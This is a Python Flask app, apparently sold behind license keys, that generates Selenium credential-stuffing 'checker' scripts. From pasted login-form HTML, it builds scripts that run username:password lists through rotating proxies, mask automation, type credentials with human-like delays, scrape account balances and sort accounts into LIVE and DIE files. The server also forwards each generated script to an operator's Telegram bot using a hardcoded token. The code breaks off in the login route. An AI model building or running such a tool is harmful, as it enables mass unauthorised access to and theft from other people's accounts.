import os, sys, json, time, uuid, re, random, secrets, threading, hashlib, io
from datetime import datetime, timedelta
from functools import wraps

def install(pkg):
    try: __import__(pkg.replace('-','_').replace('.','_'))
    except: os.system(f"{sys.executable} -m pip install {pkg} --quiet 2>nul")

for d in ['flask','flask-cors','werkzeug','requests','colorama','selenium','webdriver-manager']:
    install(d)

import base64
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for, abort
from flask_cors import CORS
import requests as http_requests
from colorama import init, Fore, Style
init(autoreset=True)

# ========== CONFIG ==========
PORT = int(os.environ.get('PORT', 5000))
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', f'http://localhost:{PORT}')
BOT_TOKEN = "8952767112:AAGsG1yxraZXY0IkZ3QmIGu5_jfTXhhhGas"
ADMIN_ID = 8617449427
ADMIN_PASSWORD = "hipolito"  # senha padrão do painel
API_STORAGE_FILE = "apis_criadas.json"

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(64)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
CORS(app, resources={r"/api/*": {"origins": "*"}})
os.makedirs('scripts_gerados', exist_ok=True)

# Rate limiting simples
_rate = {}
def rate_limit(max_req=10, window=60):
    def deco(f):
        @wraps(f)
        def wrap(*a, **kw):
            ip = request.remote_addr or 'x'
            now = time.time()
            hits = [t for t in _rate.get(ip, []) if now - t < window]
            if len(hits) >= max_req:
                return jsonify({'success': False, 'message': 'Muitas requisições. Aguarde.'}), 429
            hits.append(now)
            _rate[ip] = hits
            return f(*a, **kw)
        return wrap
    return deco

# ========== KEYS (mantidas) ==========
KEYS = json.loads(base64.b64decode("eyJjeWJlciI6IHsidXNlciI6ICJAY3liZXJzZWNvZmMiLCAiZXhwaXJhIjogIjE0LzAxMi8yMDI3In19").decode('utf-8'))

# ========== STORAGE ==========
def load_apis():
    if os.path.exists(API_STORAGE_FILE):
        try:
            return json.load(open(API_STORAGE_FILE, 'r', encoding='utf-8'))
        except: return []
    return []

def save_apis(data):
    with open(API_STORAGE_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# ========== TELEGRAM BOT ==========
def tg_send(text, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        print(f"[TG MSG ERR] {e}")

def tg_send_doc(file_bytes, filename, caption, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={'chat_id': chat_id, 'caption': caption[:1000]},
            files={'document': (filename, io.BytesIO(file_bytes), 'text/x-python')},
            timeout=30
        )
    except Exception as e:
        print(f"[TG DOC ERR] {e}")

def tg_polling():
    """Escuta comandos /api e /apis do admin"""
    offset = 0
    while True:
        try:
            r = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=40
            ).json()
            if not r.get('ok'):
                time.sleep(5); continue
            for upd in r.get('result', []):
                offset = upd['update_id'] + 1
                msg = upd.get('message')
                if not msg: continue
                chat_id = msg['chat']['id']
                if str(chat_id) != str(ADMIN_ID):
                    continue  # só admin
                txt = (msg.get('text') or '').strip()
                if txt == '/api':
                    apis = load_apis()
                    if not apis:
                        tg_send("❌ Nenhuma API criada ainda.", chat_id)
                        continue
                    last = apis[-1]
                    content = last.get('script', '')
                    tg_send_doc(
                        content.encode('utf-8'),
                        f"{last.get('site','api')}.py",
                        f"🔹 <b>ÚLTIMA API</b>\nSite: <code>{last.get('site','?')}</code>\nCriada: {last.get('data','?')}\nPor: <code>{last.get('user','?')}</code>",
                        chat_id
                    )
                elif txt == '/apis':
                    apis = load_apis()
                    if not apis:
                        tg_send("❌ Nenhuma API criada ainda.", chat_id)
                        continue
                    tg_send(f"📦 <b>{len(apis)} API(s) criada(s)</b>\nEnviando todas...", chat_id)
                    for a in apis:
                        content = a.get('script', '')
                        tg_send_doc(
                            content.encode('utf-8'),
                            f"{a.get('site','api')}.py",
                            f"🔹 Site: <code>{a.get('site','?')}</code>\nData: {a.get('data','?')}\nUser: <code>{a.get('user','?')}</code>",
                            chat_id
                        )
                        time.sleep(1)
                elif txt == '/start':
                    tg_send(
                        "🤖 <b>HIPÓLITO BOT</b>\n\n"
                        "Comandos:\n"
                        "/api - Mostra a última API criada\n"
                        "/apis - Envia todas as APIs criadas\n"
                        "/status - Status do servidor",
                        chat_id
                    )
                elif txt == '/status':
                    apis = load_apis()
                    tg_send(f"✅ Online\n📦 APIs: {len(apis)}", chat_id)
        except Exception as e:
            print(f"[TG POLL ERR] {e}")
            time.sleep(5)

# ========== CSS ==========
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap');
    @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css');
    :root{--bg:#0a0a12;--s1:#111122;--s2:#181830;--b:#252545;--p:#ff6b35;--su:#00e676;--d:#ff3355;--w:#ffaa00;--a:#9944ff;--t:#e8e8f5;--t2:#8888bb;--t3:#555588}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--t);min-height:100vh}
    .login-container{display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(circle at 30% 20%,rgba(255,107,53,.15),transparent 60%),radial-gradient(circle at 70% 80%,rgba(153,68,255,.12),transparent 60%),var(--bg);position:relative}
    .login-box{position:relative;z-index:1;background:rgba(20,20,35,0.7);border:1px solid rgba(255,107,53,0.5);border-radius:20px;padding:40px;max-width:450px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.4);backdrop-filter:blur(12px);text-align:center}
    .login-box .logo{font-family:'Orbitron',sans-serif;font-size:2em;font-weight:900;background:linear-gradient(135deg,#ff6b35,#ffaa00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px}
    .login-box .subtitle{color:rgba(255,255,255,0.7);font-size:0.8em;margin-bottom:30px;letter-spacing:2px}
    .login-box input{width:100%;padding:14px 18px;background:rgba(0,0,0,0.35);border:2px solid rgba(255,107,53,0.4);border-radius:12px;color:#fff;font-family:'JetBrains Mono',monospace;font-size:0.9em;outline:none;transition:all 0.3s;text-align:center}
    .login-box input:focus{border-color:#ff6b35;box-shadow:0 0 20px rgba(255,107,53,0.3);background:rgba(0,0,0,0.5)}
    .login-box .btn{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#ff6b35,#ff4500);color:#fff;font-weight:700;font-size:1em;cursor:pointer;margin-top:15px;letter-spacing:1px;transition:all 0.3s}
    .login-box .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,53,0.4)}
    .error{color:#ff3355;margin-top:12px;font-size:0.85em}
    .app{max-width:1100px;margin:0 auto;padding:20px}
    .header{text-align:center;padding:35px 20px 25px}
    .logo-main{font-family:'Orbitron',sans-serif;font-size:2.5em;font-weight:900;letter-spacing:4px;background:linear-gradient(135deg,#ff6b35,#ffaa00,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:glow 2s ease-in-out infinite alternate}
    @keyframes glow{from{filter:brightness(1)}to{filter:brightness(1.3)}}
    .subtitle{font-family:'JetBrains Mono',monospace;color:var(--t3);letter-spacing:3px;font-size:.85em;margin-top:10px}
    .badge-row{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap}
    .badge{padding:6px 16px;border-radius:20px;font-size:.75em;font-weight:600;letter-spacing:1px}
    .badge-p{background:rgba(255,107,53,.15);color:var(--p);border:1px solid rgba(255,107,53,.3)}
    .badge-g{background:rgba(0,230,118,.15);color:var(--su);border:1px solid rgba(0,230,118,.3)}
    .badge-a{background:rgba(153,68,255,.15);color:var(--a);border:1px solid rgba(153,68,255,.3)}
    .card{background:var(--s2);border:1px solid var(--b);border-radius:16px;padding:28px;margin-bottom:20px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
    .card-title{font-size:1.2em;font-weight:700;margin-bottom:8px;color:var(--p);display:flex;align-items:center;gap:10px}
    .card-desc{color:var(--t2);font-size:.85em;margin-bottom:20px;line-height:1.6}
    .form-group{margin-bottom:16px}
    .form-label{display:block;font-weight:600;margin-bottom:6px;color:var(--t2);font-size:.85em}
    .form-input,textarea,select{width:100%;padding:12px 16px;background:var(--bg);border:2px solid var(--b);border-radius:10px;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:.85em;outline:none;transition:all .3s}
    .form-input:focus,textarea:focus,select:focus{border-color:var(--p);box-shadow:0 0 0 4px rgba(255,107,53,.3)}
    textarea{min-height:140px;resize:vertical}
    .btn-main{padding:12px 24px;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:.9em;letter-spacing:1px;transition:all .3s;display:inline-flex;align-items:center;gap:8px;text-decoration:none;font-family:'Inter',sans-serif}
    .btn-p{background:linear-gradient(135deg,#ff6b35,#ff4500);color:#fff;box-shadow:0 4px 20px rgba(255,107,53,.3)}
    .btn-p:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,107,53,.3)}
    .btn-s{background:linear-gradient(135deg,var(--su),#00c853);color:#000}
    .btn-g{background:linear-gradient(135deg,var(--a),#6600cc);color:#fff}
    .btn-block{width:100%;justify-content:center}
    .btn-logout{background:var(--d);color:#fff;padding:8px 16px;border-radius:8px;text-decoration:none;font-size:.8em}
    .code-block{background:#000;border:1px solid var(--b);border-radius:10px;padding:20px;font-family:'JetBrains Mono',monospace;color:#00ff88;overflow-x:auto;white-space:pre-wrap;max-height:500px;overflow-y:auto;font-size:.8em;line-height:1.5}
    .alert{padding:14px 18px;border-radius:10px;margin:14px 0;font-weight:500;display:flex;align-items:center;gap:10px}
    .alert-s{background:rgba(0,230,118,.1);border:1px solid rgba(0,230,118,.3);color:var(--su)}
    .alert-e{background:rgba(255,51,85,.1);border:1px solid rgba(255,51,85,.3);color:var(--d)}
    .alert-i{background:rgba(255,107,53,.1);border:1px solid rgba(255,107,53,.3);color:var(--p)}
    .top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
    @media(max-width:768px){.logo-main{font-size:2em}.card{padding:18px}.grid2{grid-template-columns:1fr}}
    .hidden{display:none!important}
    .progress{height:8px;background:var(--b);border-radius:4px;overflow:hidden;margin-top:10px}
    .progress-bar{height:100%;background:linear-gradient(90deg,#ff6b35,#ffaa00);width:0%;transition:width .4s}
</style>
"""

# ========== PARSER ==========
class Parser:
    @staticmethod
    def parse(text):
        lines = text.strip().split('\n')
        steps, first = [], None
        for line in lines:
            line = line.strip()
            if not line: continue
            if line.startswith('http'):
                if not first: first = line
                steps.append({'t':'url','v':line,'d':'Navegar'})
                continue
            if line.startswith('<'):
                p = Parser._tag(line)
                if p: steps.append(p)
        return steps, first

    @staticmethod
    def _tag(html):
        attrs = dict(re.findall(r'(\w[\w-]*)\s*=\s*"([^"]*)"', html))
        m = re.match(r'<(\w+)', html)
        tag = m.group(1).lower() if m else ''
        if tag not in ['input','button','a','div','span','select','textarea']: return None
        it = attrs.get('type','').lower()
        nm = attrs.get('name','')
        ida = attrs.get('id','')
        ph = attrs.get('placeholder','')
        ac = attrs.get('autocomplete','')
        cl = attrs.get('class','')
        vl = attrs.get('value','')
        tx = re.search(r'>([^<]*)<', html)
        tx = tx.group(1).strip() if tx else ''
        if ida and ida not in ['false','']: sel = f"#{ida}"
        elif nm: sel = f"{tag}[name='{nm}']"
        elif ph: sel = f"{tag}[placeholder='{ph}']"
        elif ac: sel = f"{tag}[autocomplete='{ac}']"
        elif vl: sel = f"{tag}[value='{vl}']"
        else: sel = tag
        if it == 'hidden': return None
        click_words = ['btn','button','entrar','login','submit','enviar','acessar','sign','continuar','next','proximo','confirmar','ok','go','ir','cadastrar','registrar','criar','conta','comprar','pagar','finalizar','salvar','search','buscar','pesquisar','send','acessa','loga','validar','verificar','confirm','done','pronto','concluir','yes','sim','aceitar','concordo','continue','prosseguir','apply','aplicar','add','adicionar','remove','remover','delete','excluir','edit','editar','update','atualizar','download','upload','baixar','open','abrir','close','fechar','exit','sair','start','iniciar','começar','stop','parar','play','like','share','compartilhar','follow','seguir','settings','configurações','profile','perfil','account','conta','logout','deslogar','sign out','sign in','sign up','register now','cadastre-se','criar conta','faça login','fazer login','entrar agora','acessar conta','minha conta','painel','dashboard']
        combined = f"{cl} {tx} {vl} {nm} {ida} {ph} {ac}".lower()
        is_btn = tag == 'button' or (tag == 'input' and it in ['submit','button','reset']) or (tag == 'a' and tx) or (tag == 'div' and tx and any(w in combined for w in click_words)) or (tag == 'span' and tx and any(w in combined for w in click_words))
        if is_btn:
            dt = tx or vl or 'Click'
            return {'t':'click','s':sel,'x':dt,'d':f'Clicar: {dt[:40]}'}
        if tag in ['input','textarea']:
            c = 'user' if it == 'email' or re.search(r'(user|username|login|email|mail|cpf|document)',f"{nm} {ida} {ph} {ac}".lower()) else 'pass' if it == 'password' or re.search(r'(password|senha|pass|pwd)',f"{nm} {ida} {ph} {ac}".lower()) else 'text'
            return {'t':'input','s':sel,'c':c,'d':f'Digitar: {c}'}
        if tag == 'select': return {'t':'select','s':sel,'d':'Selecionar'}
        return None

# ========== GENERATOR ==========
class Gen:
    @staticmethod
    def generate(steps, name='script.py', url=None, site_name='site'):
        L = []
        L.append('#!/usr/bin/env python3')
        L.append('# -*- coding: utf-8 -*-')
        L.append(f'# HIPÓLITO AUTO CODER | Execute: python {name}')
        L.append('import os,sys,time,random,re,json')
        L.append('from datetime import datetime')
        L.append('from selenium import webdriver')
        L.append('from selenium.webdriver.common.by import By')
        L.append('from selenium.webdriver.chrome.service import Service')
        L.append('from selenium.webdriver.chrome.options import Options')
        L.append('from selenium.webdriver.support.ui import WebDriverWait')
        L.append('from selenium.webdriver.support import expected_conditions as EC')
        L.append('')
        L.append('for p in ["selenium","webdriver-manager","colorama"]:')
        L.append('    try:__import__(p.replace("-","_"))')
        L.append('    except:os.system(f"{sys.executable} -m pip install {p} --quiet")')
        L.append('from webdriver_manager.chrome import ChromeDriverManager')
        L.append('from colorama import init,Fore,Style')
        L.append('init(autoreset=True)')
        L.append('')
        L.append('C=Fore.CYAN;G=Fore.GREEN;R=Fore.RED;Y=Fore.YELLOW;W=Fore.WHITE;M=Fore.MAGENTA;E=Style.RESET_ALL')
        L.append('DB="db.txt";PRX="proxies.txt";LF="lives.txt";DF="dies.txt"')
        L.append('')
        L.append('def load(f):')
        L.append('    L=[]')
        L.append('    if not os.path.exists(f):return L')
        L.append('    for l in open(f,"r",encoding="utf-8"):')
        L.append('        l=l.strip()')
        L.append('        if l and not l.startswith("#"):')
        L.append('            p=l.split(":")')
        L.append('            if len(p)>=2:L.append({"u":p[0].strip(),"p":":".join(p[1:]).strip()})')
        L.append('    return L')
        L.append('')
        L.append('def load_proxies():')
        L.append('    L=[]')
        L.append('    if not os.path.exists(PRX):return L')
        L.append('    for l in open(PRX,"r",encoding="utf-8"):')
        L.append('        l=l.strip()')
        L.append('        if l and not l.startswith("#"):L.append(l)')
        L.append('    return L')
        L.append('')
        L.append('def th(el,tx):')
        L.append('    for c in tx:el.send_keys(c);time.sleep(random.uniform(0.02,0.08))')
        L.append('def rd(a=0.3,b=1.2):time.sleep(random.uniform(a,b))')
        L.append('')
        L.append('def novo_driver(proxy=None):')
        L.append('    opts=Options()')
        L.append('    opts.add_argument("--no-sandbox")')
        L.append('    opts.add_argument("--disable-dev-shm-usage")')
        L.append('    opts.add_argument("--disable-blink-features=AutomationControlled")')
        L.append('    opts.add_argument("--window-size=1920,1080")')
        L.append('    opts.add_argument("--ignore-certificate-errors")')
        L.append('    opts.add_experimental_option("excludeSwitches",["enable-automation"])')
        L.append('    opts.add_experimental_option("useAutomationExtension",False)')
        L.append('    if proxy:')
        L.append('        opts.add_argument(f"--proxy-server={proxy}")')
        L.append('    try:return webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=opts)')
        L.append('    except:return webdriver.Chrome(options=opts)')
        L.append('')
        L.append('def clicar(driver):')
        L.append('    for sel in ["button[type=\'submit\']","input[type=\'submit\']","//button[contains(text(),\'Entrar\')]","//button[contains(text(),\'Login\')]","//button[contains(text(),\'Sign\')]","//button[contains(text(),\'Acessar\')]","//button[contains(text(),\'Continuar\')]","//button[contains(text(),\'Enviar\')]","//*[@type=\'submit\']","form button","form input[type=\'submit\']"]:')
        L.append('        try:')
        L.append('            btn=driver.find_element(By.XPATH,sel) if sel.startswith("//") else driver.find_element(By.CSS_SELECTOR,sel)')
        L.append('            if btn.is_displayed() and btn.is_enabled():')
        L.append('                driver.execute_script("arguments[0].scrollIntoView(true);",btn);rd(0.3,0.7);btn.click();return True')
        L.append('        except:continue')
        L.append('    return False')
        L.append('')
        L.append('def main():')
        L.append('    sep="="*50;sep2="-"*40')
        L.append('    print(f"{C}HIPÓLITO CHECKER{E}");print(f"{C}{sep}{E}\\n")')
        L.append('    logins=load(DB)')
        L.append('    proxies=load_proxies()')
        L.append('    if not logins:print(f"{R}[!] Nenhum login em {DB}{E}");return')
        L.append('    print(f"{C}[*] {len(logins)} logins | {len(proxies)} proxies{E}\\n")')
        L.append('    lives,dies=[],[]')
        L.append('    for i,lg in enumerate(logins,1):')
        L.append('        t1=datetime.now();cs=f"{lg[\'u\']}:{lg[\'p\']}"')
        L.append('        print(f"\\n{C}[{i}/{len(logins)}] {lg[\'u\']}{E}");print(f"{C}{sep2}{E}")')
        L.append('        proxy=random.choice(proxies) if proxies else None')
        L.append('        driver=novo_driver(proxy)')
        for s in steps:
            if s['t'] == 'url':
                L.append(f'        driver.get("{s["v"]}");rd(2,4)')
            elif s['t'] == 'input':
                sel = s['s']; cat = s['c']
                L.append(f'        try:')
                L.append(f'            el=WebDriverWait(driver,15).until(EC.presence_of_element_located((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",el);rd(0.3,0.7)')
                L.append('            el.click();el.clear();rd(0.2,0.5)')
                if cat == 'user': L.append('            th(el,lg["u"])')
                elif cat == 'pass': L.append('            th(el,lg["p"])')
                else: L.append('            el.send_keys("test")')
                L.append('        except:pass')
            elif s['t'] == 'click':
                sel = s['s']
                L.append(f'        try:')
                L.append(f'            btn=WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",btn);rd(0.3,0.8);btn.click()')
                L.append('        except:pass')
        L.append('        clicar(driver)')
        L.append('        rd(3,5);t2=datetime.now();ts=round((t2-t1).total_seconds(),1)')
        L.append('        try:pt=driver.find_element(By.TAG_NAME,"body").text')
        L.append('        except:pt=driver.page_source')
        L.append('        pl=pt.lower()')
        L.append('        saldo="";erro=""')
        L.append('        for p in [r\'R\\\\$\\\\s*[\\\\d.,]+\',r\'\\\\d+[.,]\\\\d{2}\',r\'saldo[^\\\\n]*\']:')
        L.append('            m=re.search(p,pt,re.I)')
        L.append('            if m:saldo=m.group(0)[:30];break')
        L.append('        for p in [r\'incorrect[^\\\\n]*\',r\'invalid[^\\\\n]*\',r\'error[^\\\\n]*\']:')
        L.append('            m=re.search(p,pt,re.I)')
        L.append('            if m:erro=m.group(0)[:40];break')
        L.append('        if not erro:erro=pt[:40].replace("\\n"," ").strip()')
        L.append('        ok=["welcome","bem-vindo","dashboard","painel","minha conta","my account","logado","logout","sair","success","sucesso"]')
        L.append('        fl=["incorrect","incorreto","invalid","invalido","error","erro","wrong","fail","falha"]')
        L.append('        if any(w in pl for w in ok):')
        L.append('            msg=saldo if saldo else "LOGADO COM SUCESSO"')
        L.append('            print(f"{G}LIVE ~> {cs} ~> {msg} ~> @HIPOLITO ~> {ts}s{E}");lives.append(cs)')
        L.append('        elif any(w in pl for w in fl):')
        L.append('            msg=erro if erro else "LOGIN INVALIDO"')
        L.append('            print(f"{R}DIE ~> {cs} ~> {msg} ~> @HIPOLITO ~> {ts}s{E}");dies.append(cs)')
        L.append('        else:')
        L.append('            print(f"{Y}UNKNOWN ~> {cs} ~> {erro} ~> @HIPOLITO ~> {ts}s{E}");dies.append(cs)')
        L.append('        driver.quit()')
        L.append('    for fn,data in [(LF,lives),(DF,dies)]:')
        L.append('        with open(fn,"w",encoding="utf-8") as f:')
        L.append('            for d in data:f.write(d+"\\n")')
        L.append('    print(f"\\n{C}{sep}{E}");print(f"{C}{G}{{len(lives)}} LIVES{C} | {R}{{len(dies)}} DIES{E}");print(f"{C}{sep}{E}")')
        L.append('    print(f"\\n{M}HIPÓLITO{E}")')
        L.append('if __name__=="__main__":')
        L.append('    try:main()')
        L.append('    except KeyboardInterrupt:print(f"\\n{Y}[!] Fim{E}")')
        return '\n'.join(L)

# ========== LOGIN PAGE ==========
LOGIN_PAGE = """<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>HIPÓLITO - Login</title>""" + CSS + """</head><body>
<div class="login-container">
    <div class="login-box">
        <div class="logo">HIPÓLITO</div>
        <div class="subtitle">🔑 DIGITE SUA KEY</div>
        <form method="POST">
            <input type="text" name="key" placeholder="cole sua key aqui..." required autofocus>
            <button type="submit" class="btn">ENTRAR</button>
        </form>
        <div class="error">{{error}}</div>
    </div>
</div>
</body></html>"""

# ========== MAIN PAGE ==========
MAIN_PAGE = """<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>HIPÓLITO</title>""" + CSS + """</head><body>
<div class="app">
    <div class="top-bar">
        <div><span style="color:var(--su);">✅ Logado: {{ user }}</span> | <span style="color:var(--t3);">Expira: {{ expira }}</span></div>
        <a href="/logout" class="btn-logout">SAIR</a>
    </div>
    <div class="header">
        <div class="logo-main">HIPÓLITO</div>
        <div class="subtitle">AUTO CODER v2</div>
        <div class="badge-row"><span class="badge badge-p">Selenium</span><span class="badge badge-g">Live Test</span><span class="badge badge-a">Proxy</span></div>
    </div>

    <!-- PASSO 1: Configurar site -->
    <div class="card">
        <div class="card-title">⚙️ PASSO 1 — Configurar Site</div>
        <div class="card-desc">Cole a URL e os campos HTML do formulário (input, button, etc). Use o inspetor do navegador (F12) pra pegar os seletores.</div>
        <div class="form-group">
            <label class="form-label">URL + Campos HTML</label>
            <textarea id="cfg" class="form-input" placeholder="Exemplo:
https://site.com/login
<input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Usuário&quot;>
<input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Senha&quot;>
<button type=&quot;submit&quot;>Entrar</button>"></textarea>
        </div>
        <div class="form-group">
            <label class="form-label">Nome do Site / Arquivo</label>
            <input type="text" id="site_name" class="form-input" value="site" placeholder="ex: netflix, instagram">
        </div>
        <button type="button" class="btn-main btn-p" onclick="salvarConfig()">💾 SALVAR CONFIGURAÇÃO</button>
        <div id="cfg_msg" style="margin-top:12px"></div>
    </div>

    <!-- PASSO 2: Logins + Proxy + Executar -->
    <div class="card" id="exec_card" style="display:none">
        <div class="card-title">🚀 PASSO 2 — Logins + Proxy + EXECUTAR</div>
        <div class="card-desc"><b>Formato logins:</b> <code>usuario:senha</code> (um por linha)<br>
        <b>Formato proxy:</b> <code>ip:porta</code> ou <code>user:pass@ip:porta</code> (um por linha, opcional)</div>
        <div class="grid2">
            <div class="form-group">
                <label class="form-label">👤 Logins (user:pass)</label>
                <textarea id="logins" class="form-input" placeholder="user1:pass1
user2:pass2
user3:pass3"></textarea>
            </div>
            <div class="form-group">
                <label class="form-label">🌐 Proxies (opcional)</label>
                <textarea id="proxies" class="form-input" placeholder="127.0.0.1:8080
user:pass@127.0.0.1:8080"></textarea>
            </div>
        </div>
        <div class="form-group">
            <label class="form-label">🔧 Modo de Teste</label>
            <select id="mode">
                <option value="live">🌐 Teste ao Vivo (Selenium no servidor — lento)</option>
                <option value="download">📥 Gerar Script Python (recomendado)</option>
            </select>
        </div>
        <button type="button" class="btn-main btn-g btn-block" onclick="executar()" id="btn_exec">⚡ EXECUTAR API</button>
        <div class="progress" id="prog" style="display:none"><div class="progress-bar" id="prog_bar"></div></div>
        <div id="exec_msg" style="margin-top:15px"></div>
        <div id="exec_result" style="margin-top:15px"></div>
    </div>

    <!-- PASSO 3: Resultado -->
    <div class="card" id="result_card" style="display:none">
        <div class="card-title">📄 Resultado</div>
        <div id="result_content"></div>
        <div style="margin-top:15px;display:flex;gap:10px;flex-wrap:wrap">
            <button type="button" class="btn-main btn-s" onclick="downloadScript()" id="btn_dl" style="display:none">📥 BAIXAR SCRIPT</button>
            <button type="button" class="btn-main btn-p" onclick="novaApi()">🔄 MONTAR OUTRA API</button>
        </div>
    </div>
</div>

<script>
let CONFIG = null;
let SCRIPT = '';
let SCRIPT_NAME = 'script.py';

function salvarConfig() {
    const cfg = document.getElementById('cfg').value.trim();
    const site = document.getElementById('site_name').value.trim() || 'site';
    if (!cfg) { document.getElementById('cfg_msg').innerHTML = '<div class="alert alert-e">Cole a configuração do site!</div>'; return; }
    if (!cfg.startsWith('http')) { document.getElementById('cfg_msg').innerHTML = '<div class="alert alert-e">Precisa ter uma URL http(s)!</div>'; return; }
    CONFIG = { cfg, site };
    SCRIPT_NAME = site + '.py';
    document.getElementById('cfg_msg').innerHTML = '<div class="alert alert-s">✅ Configuração salva! Agora cole logins e proxies abaixo.</div>';
    document.getElementById('exec_card').style.display = 'block';
    document.getElementById('exec_card').scrollIntoView({behavior:'smooth'});
}

async function executar() {
    if (!CONFIG) { alert('Salve a configuração primeiro!'); return; }
    const logins = document.getElementById('logins').value.trim();
    const proxies = document.getElementById('proxies').value.trim();
    const mode = document.getElementById('mode').value;
    if (!logins) { document.getElementById('exec_msg').innerHTML = '<div class="alert alert-e">Cole pelo menos 1 login!</div>'; return; }

    document.getElementById('btn_exec').disabled = true;
    document.getElementById('prog').style.display = 'block';
    document.getElementById('prog_bar').style.width = '30%';
    document.getElementById('exec_msg').innerHTML = '<div class="alert alert-i">Processando... Enviando API pro admin via Telegram...</div>';

    try {
        const r = await fetch('/api/execute', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                config: CONFIG.cfg,
                site_name: CONFIG.site,
                logins: logins,
                proxies: proxies,
                mode: mode
            })
        });
        const d = await r.json();
        document.getElementById('prog_bar').style.width = '100%';
        if (d.success) {
            SCRIPT = d.script || '';
            SCRIPT_NAME = d.filename || (CONFIG.site + '.py');
            document.getElementById('exec_msg').innerHTML = '<div class="alert alert-s">✅ ' + d.message + '</div>';
            mostrarResultado(d);
        } else {
            document.getElementById('exec_msg').innerHTML = '<div class="alert alert-e">❌ ' + d.message + '</div>';
        }
    } catch(e) {
        document.getElementById('exec_msg').innerHTML = '<div class="alert alert-e">Erro: ' + e.message + '</div>';
    } finally {
        document.getElementById('btn_exec').disabled = false;
        setTimeout(() => { document.getElementById('prog').style.display = 'none'; }, 1500);
    }
}

function mostrarResultado(d) {
    document.getElementById('result_card').style.display = 'block';
    let html = '';
    if (d.steps_count) {
        html += '<h4 style="color:var(--p);margin-bottom:10px">Passos detectados (' + d.steps_count + '):</h4>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:15px">';
        (d.parsed_steps || []).forEach((s, i) => {
            html += '<span class="badge badge-p">' + (i+1) + '. ' + s.d + '</span>';
        });
        html += '</div>';
    }
    if (d.logins_count) {
        html += '<p style="color:var(--su)">👤 Logins: <b>' + d.logins_count + '</b> | 🌐 Proxies: <b>' + (d.proxies_count || 0) + '</b></p>';
    }
    if (d.script) {
        html += '<h4 style="color:var(--p);margin:15px 0 10px">Script gerado:</h4>';
        html += '<div class="code-block">' + escapeHtml(d.script.substring(0, 5000)) + (d.script.length > 5000 ? '\n\n... (truncado)' : '') + '</div>';
        document.getElementById('btn_dl').style.display = 'inline-flex';
    }
    if (d.tg_sent) {
        html += '<div class="alert alert-s" style="margin-top:15px">📤 API enviada automaticamente pro admin via Telegram!</div>';
    }
    document.getElementById('result_content').innerHTML = html;
    document.getElementById('result_card').scrollIntoView({behavior:'smooth'});
}

function escapeHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function downloadScript() {
    if (!SCRIPT) { alert('Nada pra baixar!'); return; }
    const b = new Blob([SCRIPT], {type: 'text/python'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = SCRIPT_NAME;
    a.click();
}

function novaApi() {
    CONFIG = null; SCRIPT = '';
    document.getElementById('cfg').value = '';
    document.getElementById('logins').value = '';
    document.getElementById('proxies').value = '';
    document.getElementById('exec_card').style.display = 'none';
    document.getElementById('result_card').style.display = 'none';
    document.getElementById('cfg_msg').innerHTML = '';
    document.getElementById('exec_msg').innerHTML = '';
    document.getElementById('result_content').innerHTML = '';
    document.getElementById('btn_dl').style.display = 'none';
    document.getElementById('cfg').scrollIntoView({behavior:'smooth'});
}
</script>
</body></html>"""

# ========== ROUTES ==========
@app.route('/', methods=['GET', 'POST'])
def login():
    if 'key' in session:
        return redirect('/app')
    error = ''
    if request.method == 'POST':
        key = request.form.get('key', '').strip()
        if key in KEYS:
            session['key'] = key
            session['user'] = KEYS[key]['user']
            session['expira'] = KEYS[key]['expira']
            session.permanent = True
            return redirect('/app')
        elif key == ADMIN_PASSWORD:
            session['key'] = 'admin'
            session['user'] = '@HIPOLITO'
